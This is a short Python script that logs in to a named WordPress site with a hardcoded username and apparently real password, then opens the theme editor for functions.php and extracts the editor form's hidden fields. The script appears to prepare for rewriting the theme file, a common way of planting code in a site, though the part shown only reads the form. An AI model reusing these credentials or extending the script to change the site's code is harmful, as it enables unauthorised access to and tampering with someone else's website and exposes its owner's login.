import requests
import re

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})

login_url = 'https://bolouplive.com/1c86y6aypsqcbgpgxvhw0-fow_zml13r66c_jfigjdfk'
session.post(login_url, data={'log': 'irza', 'pwd': 'XEugcL8XpK#PH^ffs0O1%H6h', 'rememberme': 'forever'})

r = session.get('https://bolouplive.com/wp-admin/theme-editor.php?file=functions.php')
# Find form
form_m = re.search(r'<form[^>]*id=["\']template["\'][^>]*>([\s\S]*?)</form>', r.text)
if form_m:
    print("Found template form:")
    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', form_m.group(1))
    for name, val in inputs:
        print(f"  {name} = {val}")

